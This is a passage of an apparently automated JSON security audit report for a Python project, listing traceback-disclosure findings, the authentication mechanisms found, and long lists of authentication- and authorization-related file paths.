            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 5659,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/backend_qt.py",
            "line": 511,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/python_learning/examples/learning_demo.py",
            "line": 325,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/cli/base_command.py",
            "line": 213,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 829,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/core.py",
            "line": 5659,
            "issue": "Exception details printed",
            "severity": "MEDIUM"
          },
          {
            "file": "src/utils/security.py",
            "line": 1123,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "src/monitoring/setup_monitoring.py",
            "line": 608,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "src/mcp/deployment/cli.py",
            "line": 221,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          },
          {
            "file": "rust_core/security_audit_env/mcp_learning_system/python_learning/examples/learning_demo.py",
            "line": 325,
            "issue": "Traceback disclosure",
            "severity": "MEDIUM"
          }
        ],
        "risk_level": "MEDIUM"
      }
    },
    "authentication_audit": {
      "authentication_mechanisms": {
        "mechanisms_found": {
          "jwt_tokens": true,
          "oauth2": true,
          "basic_auth": true,
          "api_keys": true,
          "custom_auth": false
        },
        "authentication_files": [
          "test_all_mcp_servers_parallel.py",
          "test_env/lib/python3.12/site-packages/requests/models.py",
          "test_gemini_direct.py",
          "security_audit_phase3_infrastructure.py",
          "deploy_mcp_security_hardened.py",
          "tests/utils/test_data.py",
          "examples/claude_code_circle_of_experts.py",
          "test_env/lib/python3.12/site-packages/websockets/__init__.py",
          "src/auth/api.py",
          "security_audit_circle_consultation.py",
          "mcp_servers/test_api_integration_stability.py",
          "examples/circle_of_experts_rust_accelerated.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/profiling.py",
          "test_security_updates.py",
          "test_env/lib/python3.12/site-packages/fastapi/openapi/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/rules.py",
          "src/database/models.py",
          "mcp_learning_system/add_missing_commands.py",
          "src/circle_of_experts/core/connection_pool_integration.py",
          "src/auth/audit.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "tests/circle_of_experts/test_backwards_compat.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "bash_god_devops_expansion.py",
          "test_env/lib/python3.12/site-packages/aiohttp/__init__.py",
          "test_production_modules_comprehensive.py",
          "update_all_documentation_parallel.py",
          "test_env/lib/python3.12/site-packages/jwt/warnings.py",
          "test_circle_of_experts_comprehensive.py",
          "simple_api_demo.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/gbq.py",
          "demo_api_integrations.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "agent_6_api_integration_tests.py",
          "backup_agent3_20250607_010225/src/mcp/servers.py",
          "discover_and_integrate_mcp_servers.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "test_env/lib/python3.12/site-packages/requests/sessions.py",
          "test_env/lib/python3.12/site-packages/jwt/api_jwt.py",
          "src/database/init.py",
          "src/circle_of_experts/drive/manager.py",
          "comprehensive_test_suite.py",
          "discover_and_integrate_mcp_servers_v2.py",
          "test_env/lib/python3.12/site-packages/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/websockets/sync/server.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "test_memory_leak_fixes.py",
          "test_env/lib/python3.12/site-packages/aiohttp/helpers.py",
          "agent4_comprehensive_security_audit.py",
          "src/auth/__init__.py",
          "mcp_servers/templates/python-server.py",
          "test_rbac_simple.py",
          "test_env/lib/python3.12/site-packages/urllib3/util/request.py",
          "src/circle_of_experts/experts/commercial_experts.py",
          "security_audit_phase2.py",
          "validate_phase1_security.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "test_mcp_servers.py",
          "mcp_learning_system/security_monitoring_expansion.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "api_performance_benchmark.py",
          "mcp_learning_system/test_agent8_simple.py",
          "scripts/setup_pipeline.py",
          "supply_chain_security_audit.py",
          "test_deepseek_simple.py",
          "test_deepseek_direct.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_env/lib/python3.12/site-packages/fastapi/security/oauth2.py",
          "src/auth/user_manager.py",
          "code-base-crawler/code-base-crawler/run_security_validation.py",
          "src/core/logging_config.py",
          "test_env/lib/python3.12/site-packages/jwt/api_jws.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "backup_agent3_20250607_010225/docs/api/clients/python-client.py",
          "backup_agent3_20250607_010225/src/mcp/security/scanner_server.py",
          "test_mcp_comprehensive.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
          "deploy_mcp_production_final.py",
          "test_logging_system.py",
          "devops_expansion_integration.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "src/mcp/monitoring/prometheus_server.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "rust_core/security_audit_env/mcp_learning_system/deployment/scripts/production_certification.py",
          "deploy_mcp_production_fixed.py",
          "test_gemini_integration.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "mcp_learning_system/test_production_integration_agent8.py",
          "setup_mcp_servers_complete.py",
          "scripts/setup_circle_of_experts.py",
          "test_circle_of_experts_local_validation.py",
          "test_phase1_security_mitigations.py",
          "test_rbac_core.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_httpauth.py",
          "fix_remaining_issues.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "src/api/brave_client.py",
          "install_mcpso_servers_final.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pyparsing/common.py",
          "test_advanced_security_mitigations.py",
          "test_env/lib/python3.12/site-packages/jwt/__init__.py",
          "test_env/lib/python3.12/site-packages/fastapi/security/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "src/api/smithery_client.py",
          "security_audit_test.py",
          "test_env/lib/python3.12/site-packages/httpx/__init__.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "src/circle_of_experts/experts/claude_expert.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "backup_agent3_20250607_010225/src/mcp/monitoring/prometheus_server.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "test_all_mcp_servers.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "tests/conftest.py",
          "test_security_mcp_servers_comprehensive.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "test_mcp_security_integration.py",
          "src/circle_of_experts/experts/expert_factory.py",
          "test_rbac_system.py",
          "src/mcp/servers.py",
          "scripts/verify_mcp_imports.py",
          "code-base-crawler/code-base-crawler/security_remediation.py",
          "test_env/lib/python3.12/site-packages/jwt/exceptions.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "docs/api/clients/python-client.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "mcp_servers/api_integration_stability_test.py",
          "src/auth/middleware.py",
          "test_env/lib/python3.12/site-packages/websockets/legacy/auth.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_deepseek_integration.py",
          "test_environments/circle_experts/experts/security_expert.py",
          "monitoring/mcp_logging.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "test_security_mitigations.py",
          "test_env/lib/python3.12/site-packages/requests/auth.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "src/utils/security.py",
          "test_openrouter_direct.py",
          "comprehensive_module_test_suite.py",
          "code-base-crawler/code-base-crawler/deploy_security_framework.py",
          "examples/video_to_documentation_example.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/rules.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/request.py",
          "src/circle_of_experts/experts/openrouter_expert.py",
          "simple_deepseek_test.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
          "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
          "test_env/lib/python3.12/site-packages/httpx/_client.py",
          "tests/fixtures/test_data_manager.py",
          "test_circle_of_experts_simple.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_env/lib/python3.12/site-packages/fastapi/openapi/docs.py",
          "test_env/lib/python3.12/site-packages/six.py",
          "agent_6_comprehensive_integration_testing_framework.py",
          "deploy_parallel_10_agents.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabberclient.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
          "test_env/lib/python3.12/site-packages/jwt/api_jwk.py",
          "validate_final_security.py",
          "src/api/tavily_client.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "code-base-crawler/code-base-crawler/security_scan.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "security_audit.py",
          "test_env/lib/python3.12/site-packages/hyperlink/test/test_url.py",
          "test_env/lib/python3.12/site-packages/fastapi/security/api_key.py",
          "src/api/__init__.py",
          "src/database/repositories/user_repository.py",
          "comprehensive_documentation_validator.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "test_environments/chaos_engineering/failure_injector.py",
          "src/security/mcp_security_core.py",
          "src/database/migrations/alembic/versions/20250531_0001_initial_schema.py",
          "mcp_learning_system/deployment/scripts/production_certification.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "test_env/lib/python3.12/site-packages/jwt/jwk_set_cache.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "test_env/lib/python3.12/site-packages/jwt/jwks_client.py",
          "test_rbac_direct.py",
          "src/security/mcp_secure_server.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/distlib/compat.py",
          "src/security/vulnerability_management.py",
          "agent_6_real_mcp_server_tests.py",
          "code-base-crawler/code-base-crawler/cbc_security/error_sanitizer.py",
          "test_env/lib/python3.12/site-packages/fastapi/dependencies/utils.py",
          "monitoring/mcp_tracing.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "src/mcp/security/auth_middleware.py",
          "test_env/lib/python3.12/site-packages/aiohttp/client.py",
          "verify_circle_of_experts.py",
          "test_env/lib/python3.12/site-packages/fastapi/applications.py",
          "test_env/lib/python3.12/site-packages/urllib3/_request_methods.py",
          "src/api/manager.py",
          "src/api/base.py",
          "src/auth/models.py",
          "backup_agent3_20250607_010225/src/mcp/security/auth_middleware.py",
          "test_env/lib/python3.12/site-packages/fastapi/param_functions.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_php_builtins.py",
          "full_stack_review.py",
          "src/circle_of_experts/experts/open_source_experts.py",
          "code-base-crawler/code-base-crawler/run_enhanced_security_audit.py",
          "src/mcp/security/scanner_server.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "validate_security_updates.py",
          "tests/security/comprehensive_security_tests.py",
          "validation_config_test.py",
          "code-base-crawler/code-base-crawler/run_security_audit.py",
          "backup_agent3_20250607_010225/src/core/logging_config.py",
          "src/auth/tokens.py",
          "mcp_learning_system/bash_god_security_commands.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "test_env/lib/python3.12/site-packages/httpx/_auth.py",
          "test_database_integration.py",
          "enhanced_supply_chain_audit.py",
          "src/auth/rbac.py",
          "test_mcp_servers_simplified.py",
          "monitoring/mcp_health_checks.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_api_integrations.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/network/session.py",
          "src/api/config.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "mcp_learning_system/final_production_validation.py",
          "agent_6_load_testing_integration_suite.py",
          "scripts/run_memory_tests.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/request.py",
          "mcp_servers/mcp_api_integration_server.py",
          "test_rbac_standalone.py",
          "test_env/lib/python3.12/site-packages/jwt/help.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/six.py",
          "test_env/lib/python3.12/site-packages/prometheus_client/exposition.py",
          "test_authentication_bypass_fixes.py",
          "src/auth/permissions.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "test_mcp_security_comprehensive.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/common.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/six.py",
          "test_env/lib/python3.12/site-packages/aiohttp/client_reqrep.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
          "test_final_security_validation.py"
        ],
        "security_score": 80
      },
      "authorization_controls": {
        "authorization_controls_found": 7651,
        "authorization_files": [
          "test_all_mcp_servers_parallel.py",
          "tests/utils/memory_test_utils.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pygments/style.py",
          "test_environments/stress_testing/core/cycle_manager.py",
          "test_env/lib/python3.12/site-packages/pydantic_core/core_schema.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/metrics/cluster/_supervised.py",
          "test_env/lib/python3.12/site-packages/twisted/web/_template_util.py",
          "src/auth/api.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/packaging/specifiers.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_known_annotated_metadata.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/retry.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexer.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/_orm_constructors.py",
          "test_env/lib/python3.12/site-packages/twisted/web/distrib.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_stats_py.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/_serialization.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/suite/test_reflection.py",
          "test_mcp_reliability_validation.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/ssh/userauth.py",
          "src/circle_of_experts/utils/retry.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/pop3.py",
          "src/core/circuit_breaker.py",
          "test_environments/mcp_integration/communication.py",
          "test_env/lib/python3.12/site-packages/fastapi/utils.py",
          "test_env/lib/python3.12/site-packages/h11/_connection.py",
          "test_env/lib/python3.12/site-packages/pydantic/deprecated/config.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/mysql/base.py",
          "test_env/lib/python3.12/site-packages/_pytest/cacheprovider.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/oracledb.py",
          "test_env/lib/python3.12/site-packages/anyio/abc/_testing.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/ident.py",
          "test_env/lib/python3.12/site-packages/dataclasses_json/cfg.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_discriminated_union.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/self_outdated_check.py",
          "test_env/lib/python3.12/site-packages/anyio/streams/buffered.py",
          "test_env/lib/python3.12/site-packages/pydantic/functional_validators.py",
          "test_environments/chaos_engineering/scenarios/cascade_failure.py",
          "test_env/lib/python3.12/site-packages/automat/_test/test_visualize.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/lisp.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tseries/holiday.py",
          "mcp_learning_system/servers/bash_god/python_src/learning.py",
          "test_env/lib/python3.12/site-packages/pydantic/experimental/pipeline.py",
          "test_env/lib/python3.12/site-packages/twisted/spread/test/test_pb.py",
          "src/mcp/deployment/deployment_monitor.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/interfaces.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/utils.py",
          "test_environments/scaling/cost_optimizer.py",
          "agent7_performance_matrix_validation.py",
          "test_env/lib/python3.12/site-packages/markdown_it/rules_block/heading.py",
          "agent4_comprehensive_security_audit.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/provision.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/util/__init__.py",
          "backup_agent3_20250607_010225/src/core/connections.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_insults.py",
          "backup_agent3_20250607_010225/src/core/memory_monitor.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/commands/library.py",
          "test_env/lib/python3.12/site-packages/zope/interface/tests/test_odd_declarations.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/schema_generator.py",
          "test_mcp_servers.py",
          "test_environments/monitoring/real_time_processor.py",
          "api_performance_benchmark.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/ed25519.py",
          "test_env/lib/python3.12/site-packages/pydantic/root_model.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/validators/performance_validator.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/ensemble/_weight_boosting.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/engine/reflection.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/dh.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_env/lib/python3.12/site-packages/twisted/python/test/test_shellcomp.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/manhole.py",
          "test_env/lib/python3.12/site-packages/anyio/_core/_tempfile.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/scenarios/learning_under_load.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_unix.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/integration.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/checkers.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/types.py",
          "test_env/lib/python3.12/site-packages/httpcore/_backends/anyio.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_dataclasses.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/linear_model/_ridge.py",
          "test_env/lib/python3.12/site-packages/automat/_typed.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/rich/pretty.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/connection.py",
          "test_env/lib/python3.12/site-packages/twisted/python/failure.py",
          "test_env/lib/python3.12/site-packages/twisted/pair/tuntap.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/errors.py",
          "mcp_learning_system/bash_god_mcp_server_backup_20250608_184019.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_inotify.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/_mathtext.py",
          "scripts/simple_production_validator.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/transform.py",
          "mcp_servers/src/core/performance_optimizer.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/reorderGlyphs.py",
          "deploy_mcp_production_final.py",
          "test_env/lib/python3.12/site-packages/constantly/_constants.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/ciphers/base.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/ensemble/_bagging.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_win32events.py",
          "src/mcp/startup_optimizer.py",
          "test_env/lib/python3.12/site-packages/httpcore/_models.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/schema.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_conch.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/dsa.py",
          "test_env/lib/python3.12/site-packages/tortoise/backends/oracle/client.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/ext/mypy/decl_class.py",
          "test_env/lib/python3.12/site-packages/coverage/parser.py",
          "mcp_learning_system/test_production_integration_agent8.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py",
          "mcp_learning_system/learning_core/optimization.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/distro/distro.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/python.py",
          "test_circle_of_experts_local_validation.py",
          "test_env/lib/python3.12/site-packages/anyio/streams/stapled.py",
          "test_env/lib/python3.12/site-packages/structlog/dev.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/self_outdated_check.py",
          "test_env/lib/python3.12/site-packages/zope/interface/advice.py",
          "rust_core/security_audit_env/mcp_learning_system/learning_core/prediction_engine.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/packaging/specifiers.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/schema.py",
          "tests/memory/test_memory_leaks.py",
          "src/core/retry.py",
          "src/mcp/communication/slack_server.py",
          "src/mcp/deployment/config_manager.py",
          "rust_core/security_audit_env/mcp_learning_system/stress_testing/benchmarks/learning_benchmark.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/_windows.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/orm/util.py",
          "test_env/lib/python3.12/site-packages/pydantic/v1/mypy.py",
          "test_env/lib/python3.12/site-packages/yaml/__init__.py",
          "test_env/lib/python3.12/site-packages/rich/table.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/suite/test_types.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_schema_gather.py",
          "test_env/lib/python3.12/site-packages/httpcore/_backends/trio.py",
          "tests/run_all_mcp_tests.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/endpoints.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_survival.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/dialects/oracle/cx_oracle.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/python.py",
          "mcp_learning_system/servers/bash_god/python_src/chain_optimizer.py",
          "test_env/lib/python3.12/site-packages/tortoise/fields/data.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/conftest.py",
          "test_env/lib/python3.12/site-packages/pydantic/_internal/_model_construction.py",
          "test_env/lib/python3.12/site-packages/pypika_tortoise/context.py",
          "test_env/lib/python3.12/site-packages/anyio/from_thread.py",
          "mcp_learning_system/servers/development/python_src/server.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/dtypes/dtypes.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/bash_god/python_src/safety_learner.py",
          "test_env/lib/python3.12/site-packages/dataclasses_json/__init__.py",
          "test_env/lib/python3.12/site-packages/dateutil/tz/tz.py",
          "docs/api/clients/python-client.py",
          "test_env/lib/python3.12/site-packages/markdown_it/rules_block/state_block.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/model_selection/_search.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/basic.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/tests/metadata_routing_common.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_amp.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/insults/helper.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/dateutil/parser/_parser.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/test/test_tcp.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/serialization/ssh.py",
          "test_env/lib/python3.12/site-packages/pydantic/types.py",
          "test_env/lib/python3.12/site-packages/anyio/_core/_synchronization.py",
          "src/monitoring/memory_response.py",
          "comprehensive_module_test_suite.py",
          "test_env/lib/python3.12/site-packages/alembic/testing/suite/test_autogen_identity.py",
          "test_env/lib/python3.12/site-packages/dateutil/parser/_parser.py",
          "src/core/connection_monitoring.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexer.py",
          "test_env/lib/python3.12/site-packages/pydantic/type_adapter.py",
          "test_env/lib/python3.12/site-packages/httpcore/_async/interfaces.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/style.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/ciphers/modes.py",
          "test_environments/automation/ci_cd/github_actions.py",
          "test_environments/monitoring_integration.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/requirements.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/table.py",
          "test_env/lib/python3.12/site-packages/twisted/words/im/pbsupport.py",
          "test_env/lib/python3.12/site-packages/fastapi/encoders.py",
          "tests/fixtures/test_data_manager.py",
